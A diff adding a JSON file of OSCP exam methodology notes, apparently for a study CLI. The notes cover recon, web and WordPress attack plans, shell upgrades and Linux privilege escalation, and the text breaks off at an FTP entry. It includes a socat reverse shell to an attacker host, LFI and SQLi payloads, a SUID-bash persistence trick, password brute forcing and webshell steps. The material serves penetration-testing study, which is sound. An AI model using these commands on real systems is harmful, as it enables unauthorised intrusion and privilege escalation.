@@ -1,0 +1,453 @@
+{
+  "meta": {
+    "title": "OSCP Methods & Methodology",
+    "note": "The logic behind each step — understand the why, not just the command. Add your own entries to data/methods.json (see README)."
+  },
+  "topics": [
+    {
+      "id": "foundations",
+      "name": "Foundations — shell, context, variables"
+    },
+    {
+      "id": "workflow",
+      "name": "The complete attack path (overview)"
+    },
+    {
+      "id": "recon",
+      "name": "Recon & enumeration methodology"
+    },
+    {
+      "id": "service-attack",
+      "name": "Service-by-service attack plans"
+    },
+    {
+      "id": "access",
+      "name": "Getting a foothold"
+    },
+    {
+      "id": "shell-upgrade",
+      "name": "Shell stabilisation"
+    },
+    {
+      "id": "post-foothold",
+      "name": "Post-foothold local enumeration"
+    },
+    {
+      "id": "privesc-linux",
+      "name": "Linux privilege escalation"
+    },
+    {
+      "id": "privesc-windows",
+      "name": "Windows privilege escalation"
+    },
+    {
+      "id": "proof",
+      "name": "Flags, proof & submission"
+    },
+    {
+      "id": "reporting",
+      "name": "Report writing"
+    },
+    {
+      "id": "stuck",
+      "name": "When you're stuck"
+    }
+  ],
+  "methods": [
+    {
+      "id": "shell-context",
+      "topic": "foundations",
+      "title": "Who and where am I? (orient on a new shell)",
+      "brief": "Identify the shell, user, host and rights before doing anything",
+      "tags": [
+        "shell",
+        "$0",
+        "id",
+        "whoami",
+        "sudo -l",
+        "enumeration",
+        "context"
+      ],
+      "body": "## The question\nBefore anything else on a fresh shell, orient yourself: *what shell is this, who am I,\nwhere am I, and what am I allowed to do?* Every later decision — which privilege-escalation\npath to try, whether to upgrade the shell first — depends on these four answers.\n\n## What shell am I in?\n    echo \"$0\"        # the name this shell was invoked as: -bash, /bin/sh, zsh ...\n    echo \"$SHELL\"    # the account's default login shell from /etc/passwd (not always the one running now)\n    ps -p $$         # the real process behind this shell  ($$ = current shell's PID)\n\n`$0` is the first of the shell's *special parameters* — read-only values the shell maintains:\n\n| Parameter | Meaning |\n| --- | --- |\n| $0 | Script or shell invocation name |\n| $1, $2 ... | First, second, and subsequent arguments |\n| $# | Number of arguments |\n| $@ | All arguments, individually preserved when quoted |\n| $* | All arguments, generally combined when quoted |\n| $? | Exit status of the last command (0 = success) |\n| $$ | Process ID of the current shell |\n| $! | Process ID of the most recent background job |\n\nWhy it matters: a reverse shell often drops you into `/bin/sh` even when the account's login\nshell is bash. `$0` tells you whether you have job control, history and tab-completion — i.e.\nwhether you should upgrade the shell (see: oscp methods show shell-tty) before working.\n\n## Who am I, and what can I do?\n    id               # uid/gid + groups — membership of sudo, docker, lxd, adm, disk is a privesc lead\n    whoami\n    hostname\n    pwd\n    sudo -l          # commands you may run as another user (often root) — the very first privesc check\n\n## The mindset\nA shell is not the goal; *context* is. Answer the four — shell, user, host, rights — and the\nnext step usually chooses itself."
+    },
+    {
+      "id": "target-variable",
+      "topic": "foundations",
+      "title": "Stop retyping the IP — set TARGET / LHOST",
+      "brief": "Store the target and your IP in shell variables and reuse them",
+      "tags": [
+        "variable",
+        "export",
+        "TARGET",
+        "LHOST",
+        "env",
+        "/etc/hosts"
+      ],
+      "body": "## The problem\nDuring a box you type the target IP dozens of times. Retyping invites typos and slows you\ndown. Store it once and reference it everywhere.\n\n## Set it\n    export TARGET=10.10.10.10     # the box\n    export LHOST=10.10.14.5       # YOUR attacking IP (usually tun0)\n    export LPORT=4444\n\nUse it:\n    nmap -p- --min-rate 1000 \"$TARGET\" -oN nmap/all.txt\n    curl -s \"http://$TARGET/\"\n\n## Why `export`?\n`TARGET=10.10.10.10` on its own lives only in the current shell. `export` marks it as an\n*environment* variable, so programs you launch (nmap, curl, ffuf) inherit it. Confirm with\n`env | grep TARGET`. A non-exported variable still works for *your* typing, but a child\nprocess started from a script won't see it.\n\n## Name the host\nSome web apps only answer to a hostname (virtual hosts). Add it once:\n    echo \"$TARGET  box.htb\" | sudo tee -a /etc/hosts\n\n## Grab your VPN IP automatically\n    export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}')"
+    },
+    {
+      "id": "enumeration-mindset",
+      "topic": "recon",
+      "title": "Enumerate, don't guess",
+      "brief": "The discover -> enumerate -> identify -> exploit loop, and why scans 'find nothing'",
+      "tags": [
+        "methodology",
+        "enumeration",
+        "nmap",
+        "recon",
+        "loop"
+      ],
+      "body": "## Principle\nMost OSCP/HTB boxes fall to *thorough enumeration*, not clever exploits. The loop never\nchanges: **discover -> enumerate each service deeply -> identify a version/misconfig -> match it to a technique -> exploit -> repeat.**\n\n## The layers\n1. Hosts & ports — full sweep first, then targeted:\n       nmap -p- --min-rate 1000 \"$TARGET\" -oN nmap/all.txt\n       nmap -sCV -p <open-ports> \"$TARGET\" -oN nmap/services.txt\n2. Per service, go deep — web: dirs, vhosts, tech, source, default creds; SMB: shares, null\n   session; etc. Use `oscp show <topic>` for the exact commands.\n3. Note everything — usernames, versions, paths, emails, odd ports. Today's useless detail is\n   tomorrow's password.\n\n## \"The scan found nothing\"\nIt didn't — you missed a layer. Common misses: UDP services, a virtual host, a service on a\nhigh port, an *authenticated* view you can now reach, a default/guessable credential. Re-run\nenumeration with the new context you just gained.\n\n## Meta-rule\nIf you're stuck for 20 minutes, you're missing enumeration, not an exploit. Drop back one\nlayer and look again (see: oscp methods show stuck-checklist)."
+    },
+    {
+      "id": "shell-tty",
+      "topic": "shell-upgrade",
+      "title": "Upgrade a dumb shell to a real TTY",
+      "brief": "Get job control, history and arrow keys; why each step is needed",
+      "tags": [
+        "tty",
+        "shell",
+        "pty",
+        "stty",
+        "reverse shell",
+        "upgrade"
+      ],
+      "body": "## Why\nA raw reverse shell has no job control, no tab-completion, no arrow keys, and Ctrl-C kills the\nwhole session. Upgrade it before real work — and *before* `su`/`sudo`, which demand a TTY.\n\n## The standard dance\n    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'   # fallbacks: python / script -qc /bin/bash /dev/null\n    # press Ctrl-Z to background it\n    stty raw -echo; fg                                 # run this on YOUR box\n    export TERM=xterm; export SHELL=/bin/bash          # back inside the target shell\n    stty rows 50 cols 200                              # match your window (run `stty size` locally to get values)\n\n## Why each step\n- `pty.spawn` gives the process a *pseudo-terminal*, so tools that insist on a TTY work.\n- `stty raw -echo` on your side stops the double-echo and lets keystrokes pass through raw.\n- `fg` brings the shell back; setting `TERM` makes `clear`, `less` and editors render.\n\n## No python on the target?\nTry `script -qc /bin/bash /dev/null`, or a `socat` TTY if you can transfer it:\n    # attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444\n    # target:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444"
+    },
+    {
+      "id": "gtfobins-logic",
+      "topic": "privesc-linux",
+      "title": "GTFOBins: why a boring binary becomes root",
+      "brief": "The pattern behind SUID/sudo/capability abuse — reason, don't memorise",
+      "tags": [
+        "gtfobins",
+        "suid",
+        "sudo",
+        "capabilities",
+        "privesc",
+        "shell escape",
+        "vim"
+      ],
+      "body": "## The core idea\nPrivilege escalation via GTFOBins isn't magic — it's **inherited privilege + a feature**. If a\nprogram runs with privileges you don't have, *and* that program can be made to run arbitrary\ncommands or read/write files, then its privilege becomes yours.\n\n## The three ways a binary carries privilege\n- **sudo** — `sudo -l` lists a binary you may run as root; it runs as root.\n- **SUID bit** — `find / -perm -4000 -type f 2>/dev/null`; the binary runs as its *owner*\n  (often root), regardless of who starts it.\n- **capabilities** — `getcap -r / 2>/dev/null`; a fine-grained slice of root (e.g. `cap_setuid`).\n\n## The feature you abuse\nMany legitimate tools can spawn a shell, run a command, or read/write a file: `vim`, `find`,\n`tar`, `awk`, `less`, `nmap` (old), `env`, `python`. Combine \"runs as root\" with \"can spawn a\nshell\" and you have a root shell.\n\n## Worked example: vim\n`vim` can run shell commands (`:!sh`) and execute `:py`/`:lua`. So:\n- `sudo vim` -> inside vim type `:!/bin/sh` -> root shell.\n- `vim` is SUID -> a `:py` one-liner that calls `os.execl(\"/bin/sh\", ...)` with `-p`.\nFetch the exact, tested payload locally instead of memorising it:\n    oscp gtfo vim sudo\n\n## Takeaway\nRecognise the pattern — *which binary carries privilege, and what can that binary be made to\ndo?* — then pull the payload with `oscp gtfo <binary>`."
+    },
+    {
+      "id": "stuck-checklist",
+      "topic": "stuck",
+      "title": "When you don't know the next step",
+      "brief": "A staged checklist so you never run out of ideas",
+      "tags": [
+        "stuck",
+        "checklist",
+        "methodology",
+        "next step",
+        "privesc",
+        "foothold"
+      ],
+      "body": "## No foothold yet?\n- All 65535 TCP ports scanned? UDP top 100?\n- Every web app: directories (feroxbuster/gobuster), vhosts (ffuf Host header), page source and\n  comments, robots.txt/sitemap.xml, default creds, and the *exact version*'s known CVEs.\n- Every service version -> `searchsploit <product> <version>` and `oscp gtfo` / `oscp notes`.\n- Any credential you already found — reuse it *everywhere* (password reuse is rampant).\n\n## Have a shell, need root?\n- `sudo -l`; SUID `find / -perm -4000 -type f 2>/dev/null`; caps `getcap -r / 2>/dev/null`.\n- Cron: `/etc/crontab`, `/etc/cron.*`, and `pspy` to watch jobs run.\n- `id` groups: `docker`, `lxd`, `disk`, `adm`, `video` — each is its own path.\n- Writable files/dirs owned by root, PATH hijacks, world-writable scripts run by root.\n- Run `linpeas` — but *read* the output, don't just scroll past it.\n\n## Have creds, stuck?\n- Spray across SMB/SSH/web/AD; try as other users; try values as both usernames AND passwords.\n\n## Meta-rule\nStuck for 20 minutes? You're missing enumeration, not an exploit. Go back one layer and look\nagain — note what's new since last time and re-enumerate with it."
+    },
+    {
+      "id": "path-variable",
+      "topic": "foundations",
+      "title": "$PATH — how the shell finds a command (and the hijack)",
+      "brief": "The first-hit rule, updating PATH safely, and why hijacking works",
+      "tags": [
+        "$PATH",
+        "path",
+        "which",
+        "type",
+        "hijack",
+        "privesc",
+        "environment"
+      ],
+      "body": "## What $PATH actually is\n`$PATH` is just a colon-separated list of directories. When you type a bare command name,\nthe shell walks this list left-to-right and runs the **first** matching executable it finds.\nThat single rule is the whole mechanism — there is no hidden registry of commands.\n\n    echo \"$PATH\"                 # the list\n    which nmap; type -a nmap     # which directory won; type -a shows ALL matches, in order\n\n## The mental model\n*\"Bare name -> first hit in $PATH.\"* Two things fall straight out of that:\n- **Order matters** — a directory earlier in $PATH shadows the same-named binary later.\n- **Only listed dirs are searched** — a binary in /opt/tool needs a full path, a symlink\n  into a $PATH dir, or $PATH extended to include it.\n\n## Updating it safely\nAppend, never overwrite — keep the existing value:\n\n    export PATH=\"$PATH:/opt/tool/bin\"     # add to the END  (system dirs still win — safe)\n    export PATH=\"/opt/tool/bin:$PATH\"     # add to the FRONT (your copy wins — use on purpose)\n\nNever write `export PATH=/opt/tool/bin` on its own — that discards every system directory and\nbreaks the shell. Make it permanent in ~/.bashrc or ~/.zshrc, not by blindly editing /etc.\n\n## Why attackers love it\nIf a privileged program (a root cron job, a SUID binary) calls another command by *bare\nname*, that name is resolved through a $PATH you may control. Put your own `curl` (or\nwhatever it calls) earlier in that PATH and the privileged process runs **your** code — this\nis *PATH hijacking*, a direct corollary of the first-hit rule. Defenders counter it by always\ncalling absolute paths (/usr/bin/curl) inside privileged scripts."
+    },
+    {
+      "id": "user-shells",
+      "topic": "foundations",
+      "title": "Why a user gets a particular shell (and is it controllable?)",
+      "brief": "/etc/passwd shell field, chsh, and the nologin lock",
+      "tags": [
+        "shell",
+        "/etc/passwd",
+        "chsh",
+        "nologin",
+        "usermod",
+        "accounts"
+      ],
+      "body": "## Where a user's shell comes from\nEvery account line in /etc/passwd ends with its login shell:\n\n    name:x:uid:gid:comment:/home/name:/bin/bash\n                                       ^ login shell\n\nWhen you log in interactively, the system runs exactly that program. So *\"why does this user\nget bash and that one sh?\"* is answered by the last field of their passwd line.\n\n    grep '^bob:' /etc/passwd     # see bob's shell\n    cat /etc/shells              # shells the system treats as valid login shells\n\n## Is it controllable? Yes — by whoever has the rights\n    chsh -s /bin/zsh                         # change YOUR login shell\n    sudo chsh -s /bin/bash bob               # change someone else's (needs privilege)\n    sudo usermod -s /usr/sbin/nologin svc    # deny interactive login\n\n## The nologin / false special case\nService accounts are usually given `/usr/sbin/nologin` or `/bin/false`. That is a deliberate\nlock: the account can own files and run a service, but can't get an interactive shell. During\nprivesc this tells you which accounts are *reachable*. And if you can write /etc/passwd or run\n`usermod`, flipping a service account's shell is itself an escalation.\n\n## The pattern\nA shell is simply *\"the program login runs for you.\"* Who decides it? Whoever can edit\n/etc/passwd or run chsh/usermod — i.e. root. So control of the shell field == control of who\ncan log in, and as what."
+    },
+    {
+      "id": "sudoers-logic",
+      "topic": "privesc-linux",
+      "title": "sudoers — delegating privilege to users and groups",
+      "brief": "How a sudo rule is written, and how to read sudo -l as an attacker",
+      "tags": [
+        "sudo",
+        "sudoers",
+        "visudo",
+        "privesc",
+        "groups",
+        "NOPASSWD",
+        "sudo -l"
+      ],
+      "body": "## The question sudo answers\nsudo lets a user run specific commands *as another user* (default root). The policy lives in\n/etc/sudoers (edit with **visudo**) and /etc/sudoers.d/*. Reading that policy is exactly why\n`sudo -l` is your first privilege-escalation check.\n\n## How a rule is written\n    who       where = (as-whom)   what\n    bob       ALL   = (root)      /usr/bin/systemctl, /usr/bin/less\n    %wheel    ALL   = (ALL:ALL)   ALL          # %name = a GROUP: every member inherits it\n    svc       ALL   = (root)      NOPASSWD: /opt/backup.sh\n\nRead it as a sentence: *\"bob, on any host, may run systemctl and less as root.\"* To **grant**\ncleanly, prefer a `%group` and the narrowest command list — add the user to the group instead\nof writing a new rule each time.\n\n## Reading it as an attacker\n`sudo -l` prints precisely what you may run as root. Each allowed binary is a candidate —\ncan it spawn a shell, read a file, or write a file?\n\n    sudo -l\n    oscp gtfo <that-binary> sudo     # fetch the exact escape, if one exists\n\n`NOPASSWD` entries need no password; a wildcard argument or a script you can edit is even\nbetter (you control what root executes).\n\n## The pattern\nPrivilege delegation = **subject** (user or %group) + **target identity** + **allowed\ncommand**. To grant: narrow subject and command. To attack: every entry is *\"a program run as\nroot whose invocation you control\"* — ask what that program can be made to do."
+    },
+    {
+      "id": "permissions-model",
+      "topic": "foundations",
+      "title": "Permissions & chmod — the 3x3 grid and the +s bit",
+      "brief": "Symbolic (+/-/=), octal, and the SUID bit, from one mental model",
+      "tags": [
+        "chmod",
+        "permissions",
+        "rwx",
+        "suid",
+        "setuid",
+        "octal",
+        "sticky",
+        "privesc"
+      ],
+      "body": "## The grid behind every permission\nEvery file has three permission sets — **u**ser (owner), **g**roup, **o**thers — and each set\nhas three bits: **r**ead, **w**rite, e**x**ecute. That's all it is: a 3x3 grid. `ls -l` prints\nit as `-rwxr-x---` = owner rwx, group r-x, others nothing.\n\n    u (owner)    g (group)    o (others)\n    r w x        r w x        r w x\n\n## chmod = turn those bits on or off\nSymbolic chmod reads like a sentence: *who*, *operator*, *which bits*.\n- who: `u` `g` `o`  (or `a` = all)\n- operator: `+` add  ·  `-` remove  ·  `=` set exactly (clears the rest of that set)\n- bits: `r` `w` `x`  (plus the specials below)\n\n    chmod +x script.sh         # add execute for everyone\n    chmod u=rw,g+x,o-x file    # owner EXACTLY rw; add x to group; remove x from others\n    chmod u=wr test.txt        # owner exactly write+read; group/others left untouched\n\n`=` is the one that *clears* — `u=rw` means the owner has rw and nothing else. `+`/`-` only\nnudge the bits you name.\n\n## Octal is the same grid as numbers\nr=4, w=2, x=1; add them per set. `chmod 750 file` = owner 7 (rwx), group 5 (r-x), others 0.\nUse symbolic when you tweak one bit, octal when you set the whole thing.\n\n## The special bit: +s (SUID/SGID) — why privesc cares\n`chmod u+s file` sets **setuid**: the program then runs as its *owner*, not as the caller.\n`g+s` is setgid (runs as the owning group). This is the engine behind much of Linux privesc —\na root-owned SUID binary that can run commands hands you root.\n\n    find / -perm -4000 -type f 2>/dev/null     # hunt SUID-root binaries\n    # (as root) chmod u+s /bin/bash  =>  later  bash -p  gives a root shell\n\n`-s` removes it. The third special, the **sticky** bit (`+t`, e.g. on /tmp), means that in a\nworld-writable directory only a file's owner may delete it.\n\n## The pattern\nPermissions are just *\"which of the 3x3 bits are on, plus three special bits,\"* and chmod only\never flips those. Hold the grid in your head and every chmod — symbolic or octal — reads\nitself."
+    },
+    {
+      "id": "full-workflow",
+      "topic": "workflow",
+      "title": "The whole machine — start to finish",
+      "brief": "The end-to-end pipeline, with the oscp command to reach for at each stage",
+      "tags": [
+        "workflow",
+        "methodology",
+        "pipeline",
+        "root",
+        "flag"
+      ],
+      "body": "## The loop that never changes\n**recon -> service -> foothold -> stabilise -> enumerate -> escalate -> loot & proof -> report.**\nEvery box is this loop; only the details change. Below is the map, and the exact `oscp` command to\npull the right cheat-sheet at each step.\n\n## Quick command map (copy-paste)\nFor just the commands to run at each phase, use **`oscp howto`** — or `oscp howto <phase>` to\nzoom in (recon · service · foothold · stabilise · enumerate · escalate · proof · report). This entry\nis the narrative behind that map; `oscp howto` is the map.\n\n## 0. Set up once\n    oscp methods show target-variable      # set TARGET / LHOST so you stop retyping\n    export TARGET=10.10.10.10 ; export LHOST=10.10.14.5\n\n## 1. Recon (every port, then go deep)\n    oscp methods show recon-walkthrough    # the exact nmap passes + what to do with results\n    oscp atlas nmap | oscp atlas autorecon # tool references\nMap each open port to a service plan (step 2).\n\n## 2. Attack the service (branch by what's open)\n    oscp methods show attack-http          # 80/443  (then wordpress/php/react sub-plans)\n    oscp methods show attack-ftp           # 21\n    oscp methods show attack-ssh           # 22\n    oscp methods show attack-smb           # 139/445\n    oscp methods show attack-rdp-winrm     # 3389 / 5985\n    oscp methods show attack-databases     # 3306/1433/5432/6379/27017\n    oscp show web   ·   oscp show services ·   oscp show smb    # quick cheat-sheet categories\n\n## 3. Foothold (turn the bug into a shell)\n    oscp methods show foothold-logic\n    oscp hacktools revshell $LHOST 4444    # pick a reverse shell\n    oscp hacktools listener 4444           # catch it\n\n## 4. Stabilise the shell\n    oscp methods show shell-tty            # upgrade to a real TTY (job control, history)\n\n## 5. Local enumeration (as the new user)\n    oscp methods show post-foothold-enum   # first 10 minutes: context + linpeas + creds\n    oscp manual show linux-enum-checklist  # or windows-privesc-checklist\n\n## 6. Privilege escalation -> root/SYSTEM\n    oscp methods show privesc-linux-path   # decision tree: each finding -> a technique\n    oscp methods show privesc-windows-path\n\n## 7. Proof & loot\n    oscp methods show flags-and-proof      # local.txt / proof.txt, screenshots, submission\n\n## 8. Report\n    oscp methods show report-writing       # reproducible write-up per machine\n\n## The meta-rule\nStuck for 20 minutes at any stage? You're missing enumeration, not an exploit — drop back one layer\n(`oscp methods show stuck-checklist`). (See: enumeration-mindset.)"
+    },
+    {
+      "id": "recon-walkthrough",
+      "topic": "recon",
+      "title": "Recon in practice — the exact commands",
+      "brief": "The nmap passes to run, then how to turn each open port into an attack plan",
+      "tags": [
+        "recon",
+        "nmap",
+        "ports",
+        "enumeration",
+        "udp"
+      ],
+      "body": "## 1. Full TCP sweep, then targeted\n    export TARGET=10.10.10.10\n    nmap -p- --min-rate 1000 -T4 \"$TARGET\" -oN nmap/all.txt      # every port, fast\n    ports=$(grep -oP '^\\d+(?=/tcp open)' nmap/all.txt | paste -sd, -)\n    nmap -sCV -p \"$ports\" \"$TARGET\" -oN nmap/services.txt        # versions + default scripts\n(Short on time? `oscp atlas rustscan` / `oscp atlas masscan` find open ports fast, then feed nmap.)\n\n## 2. Don't forget UDP\n    sudo nmap -sU --top-ports 50 \"$TARGET\" -oN nmap/udp.txt      # SNMP(161), TFTP(69), DNS, etc.\n\n## 3. Map port -> service -> plan\n| Port(s) | Service | Go to |\n| --- | --- | --- |\n| 21 | FTP | `oscp methods show attack-ftp` |\n| 22 | SSH | `oscp methods show attack-ssh` |\n| 25/110/143 | SMTP/POP/IMAP | `oscp manual show smtp-enum` |\n| 53 | DNS | `oscp show dns` |\n| 80/443/8080 | HTTP(S) | `oscp methods show attack-http` |\n| 88 | Kerberos (=DC) | `oscp methods show ad-enum-without-creds`* |\n| 111/2049 | RPC/NFS | `oscp manual show nfs-enumeration` |\n| 135/139/445 | MSRPC/SMB | `oscp methods show attack-smb` |\n| 161 (UDP) | SNMP | `oscp manual show snmp-enum` |\n| 389/636 | LDAP | `oscp manual show ldap-enum` |\n| 1433/3306/5432/6379 | Databases | `oscp methods show attack-databases` |\n| 3389 / 5985 | RDP / WinRM | `oscp methods show attack-rdp-winrm` |\n(* in `oscp manual`.)\n\n## 4. The discipline\n- **Enumerate every service before exploiting any.** Launch `autorecon \"$TARGET\"` to run the passes\n  in parallel while you work the obvious ports.\n- **Note everything**: versions, usernames, emails, odd ports, paths. Today's useless detail is\n  tomorrow's password.\n- A version string -> `searchsploit <product version>` (`oscp atlas searchsploit`).\n\n## Pattern\n\"Full TCP -> targeted -sCV -> UDP top-ports -> map each port to its plan -> enumerate all before\nexploiting.\" (See: enumeration-mindset, stuck-checklist.)"
+    },
+    {
+      "id": "attack-http",
+      "topic": "service-attack",
+      "title": "Port 80/443 — the web attack plan",
+      "brief": "Fingerprint, map, then branch by the technology you find",
+      "tags": [
+        "web",
+        "http",
+        "fingerprint",
+        "fuzzing",
+        "branch"
+      ],
+      "body": "## 1. Fingerprint the stack\n    whatweb -a3 http://$TARGET ; curl -sI http://$TARGET        # server, CMS, headers\n    oscp atlas whatweb   ·   oscp atlas httpx                   # tool refs\nLook at: Server (Apache/nginx/IIS), X-Powered-By (PHP/ASP.NET), Set-Cookie (PHPSESSID, JSESSIONID,\nlaravel_session...), and the page's HTML/JS. **View source** and read the comments.\n\n## 2. Content & vhost discovery\n    feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html\n    ffuf -u http://$TARGET/FUZZ -w <wordlist> -e .php,.txt,.bak  # files/dirs\n    ffuf -u http://$TARGET -H \"Host: FUZZ.$TARGET\" -w <vhosts> -fs <size>   # virtual hosts\n    nikto -h http://$TARGET                                     # quick known-issue sweep\n(`oscp atlas feroxbuster` / `ffuf` / `gobuster` / `dirsearch`.) Add found vhosts to /etc/hosts.\n\n## 3. Branch by technology\n| You see | Go to |\n| --- | --- |\n| WordPress (wp-content, wp-login) | `oscp methods show attack-wordpress` |\n| PHP app / Apache | `oscp methods show attack-php-apache` |\n| React/Angular/Vue SPA, lots of JS, an API | `oscp methods show attack-spa-react` |\n| Tomcat (8080, /manager) | `oscp manual show tomcat-exploitation` |\n| Jenkins | `oscp manual show jenkins-exploitation` |\n| A generic CMS (Joomla/Drupal) | `oscp manual show cms-exploitation` |\n| A login form | `oscp manual show web-auth-bypass` |\n| A ?param=value | test it (step 4) |\n\n## 4. Test every input (the bug classes)\n    oscp manual show web-methodology       # the source->sink mindset\n    oscp manual show sqli-logic            # ' and 1=1 -- -   (-> oscp atlas sqlmap)\n    oscp manual show lfi-rfi-logic         # ?page=../../../../etc/passwd\n    oscp manual show file-upload-bypass    # upload a webshell\n    oscp manual show command-injection-logic ; ssti-logic ; xss-logic ; ssrf-logic\n    oscp show web                          # web cheat-sheet category\n\n## 5. Default & guessable creds\nTry admin/admin, product defaults, and creds you found elsewhere on the box. Then brute a form with\nhydra if in scope (`oscp atlas hydra`).\n\n## Pattern\n\"Fingerprint -> fuzz dirs/vhosts -> branch by tech -> test every input source-to-sink -> creds.\"\nThe webroot/version you find here also enables SQLi->RCE webshells later (`oscp manual show sqli-to-rce`)."
+    },
+    {
+      "id": "attack-wordpress",
+      "topic": "service-attack",
+      "title": "WordPress — the attack plan",
+      "brief": "wpscan enumeration to users, plugins and a theme-editor shell",
+      "tags": [
+        "web",
+        "wordpress",
+        "wpscan",
+        "cms"
+      ],
+      "body": "## 1. Enumerate with wpscan\n    wpscan --url http://$TARGET -e vp,vt,u --api-token <token>  # vuln plugins/themes + users\n    wpscan --url http://$TARGET -e ap,at,u                      # all plugins/themes if no token\n    oscp atlas wpscan\nRecord: **WP core version**, **plugins + versions** (the usual way in), and **usernames** (`-e u`,\nor author= enum, or /wp-json/wp/v2/users).\n\n## 2. Turn findings into access\n- **Vulnerable plugin/theme** -> `searchsploit <plugin>` -> often LFI/SQLi/upload/RCE. Most WP boxes\n  fall to a plugin, not core.\n- **Weak admin password** -> brute **xmlrpc** (fast) or wp-login:\n      wpscan --url http://$TARGET -U admin -P /usr/share/wordlists/rockyou.txt\n- **xmlrpc.php** enabled -> amplifies brute force (system.multicall).\n\n## 3. Admin -> shell\nOnce you have wp-admin:\n- **Appearance -> Theme Editor** -> edit 404.php/header.php of an inactive theme to a PHP webshell\n  (`oscp hacktools php`), then browse it.\n- Or **upload a malicious plugin** (zip with PHP code) -> activate -> browse.\n- Then: `oscp hacktools revshell $LHOST 4444` + `oscp hacktools listener 4444`.\n\n## 4. Loot\n    cat wp-config.php        # DB creds -> reuse for SSH/DB/other users (password reuse is everywhere)\nFound DB creds? -> `oscp methods show attack-databases`.\n\n## Pattern\n\"wpscan (-e vp,vt,u) -> vuln plugin OR weak creds -> theme editor / plugin upload -> php webshell ->\nreverse shell -> loot wp-config.\" (See: attack-php-apache, foothold-logic.)"
+    },
+    {
+      "id": "attack-php-apache",
+      "topic": "service-attack",
+      "title": "PHP apps & Apache — the attack plan",
+      "brief": "LFI, uploads, log poisoning and Apache-specific quirks",
+      "tags": [
+        "web",
+        "php",
+        "apache",
+        "lfi",
+        "upload",
+        "shellshock"
+      ],
+      "body": "## PHP application bugs (the common wins)\n    oscp manual show lfi-rfi-logic\n- **LFI**: `?page=../../../../etc/passwd` and `php://filter/convert.base64-encode/resource=config.php`\n  to read source. Escalate LFI -> RCE via **log poisoning** (`oscp manual show log-poisoning`),\n  `/proc/self/environ`, PHP sessions, or `data://`/`php://input` wrappers.\n- **File upload**: bypass filters (ext case, double ext, magic bytes, .phtml/.php5) and drop a\n  webshell -> `oscp manual show file-upload-bypass` + `oscp hacktools php`.\n- **SQLi -> RCE**: `INTO OUTFILE` a webshell if FILE priv + webroot known -> `oscp manual show sqli-to-rce`.\n- **Type juggling / deserialization**: `oscp manual show php-type-juggling` · `php-deserialization-phar`.\n\n## Get the source when you can\nLFI via `php://filter`, exposed `.git` (`oscp atlas git-dumper`), backups (`.php.bak`, `~`, `.swp`),\nor `/.phps`. Then review it: `oscp manual show web-source-review`.\n\n## Apache-specific quirks\n- **.htaccess / config leaks**: readable `/server-status`, `/.htpasswd`, `/config.php.bak`.\n- **mod_cgi + Shellshock** (old `/cgi-bin/*.sh`): `oscp manual show shellshock` — a tell is a\n  cgi-bin script + an old bash.\n- **Alias/userdir**: `/~user/` reveals local usernames.\n- **PUT enabled / WebDAV**: `oscp manual show webdav-exploitation` (`oscp atlas davtest` / `cadaver`).\n\n## Then: webshell -> reverse shell\n    oscp hacktools php            # the webshell one-liners\n    oscp hacktools revshell $LHOST 4444 ; oscp hacktools listener 4444\n\n## Pattern\n\"Read source (LFI/.git/backups) -> find the sink (LFI->RCE, upload, SQLi->OUTFILE, Shellshock) ->\nwebshell -> reverse shell.\" (See: web-methodology, sqli-to-rce, log-poisoning.)"
+    },
+    {
+      "id": "attack-spa-react",
+      "topic": "service-attack",
+      "title": "React / SPA & APIs — the attack plan",
+      "brief": "Why a JavaScript front end moves the attack surface to the API and JS files",
+      "tags": [
+        "web",
+        "react",
+        "spa",
+        "api",
+        "javascript",
+        "graphql"
+      ],
+      "body": "## The mindset shift\nA React/Angular/Vue app is mostly **static JS calling an API**. The HTML is nearly empty, so\ndirectory brute force finds little — **the attack surface is the API and the JS bundles**, not pages.\n\n## 1. Mine the JavaScript\n    # grab every JS file, then read it:\n    gau $TARGET | grep '\\.js$' ; katana -u http://$TARGET -jc     # oscp atlas gau / katana\nJS bundles leak **API base URLs, endpoints, parameter names, role flags, hidden admin routes, and\nsometimes keys/tokens**. Search for: `fetch(`, `axios`, `/api/`, `apiKey`, `token`, `admin`, `http`.\nSource maps (`.js.map`) rebuild the original source — grab them.\n\n## 2. Enumerate the API directly\n    # the API is the real target; hit it without the UI:\n    ffuf -u http://$TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt\n    oscp manual show api-and-graphql         # REST + GraphQL method\n    oscp atlas arjun                         # discover hidden parameters\n- **GraphQL** (`/graphql`)? -> `oscp methods show attack-http` branch + `oscp manual show graphql-enumeration`\n  (`oscp atlas clairvoyance` / `graphw00f`).\n\n## 3. Test the API's bug classes\n- **IDOR / broken authz**: change ids, call privileged endpoints directly (the UI hides them, the API\n  doesn't) -> `oscp manual show idor-access-control`.\n- **Auth**: JWT weaknesses -> `oscp manual show jwt-attacks-advanced` (`oscp atlas jwt_tool`).\n- **Injection** in JSON bodies: SQLi/NoSQLi/SSTI/command injection just like any param.\n- **Mass assignment**: add `\"role\":\"admin\"` to a JSON body the client never sends.\n\n## Pattern\n\"Read the JS bundles for endpoints/keys -> attack the API directly (not the UI) -> IDOR + auth +\ninjection + mass-assignment.\" The front end is a map, not the target. (See: api-and-graphql,\nidor-access-control, jwt-attacks-advanced.)"
+    },
+    {
+      "id": "attack-ftp",
+      "topic": "service-attack",
+      "title": "Port 21 (FTP) — the attack plan",
+      "brief": "Anonymous access, version exploits, and using FTP to reach other services",
+      "tags": [
+        "ftp",
+        "service",
+        "anonymous",
+        "transfer"
+      ],
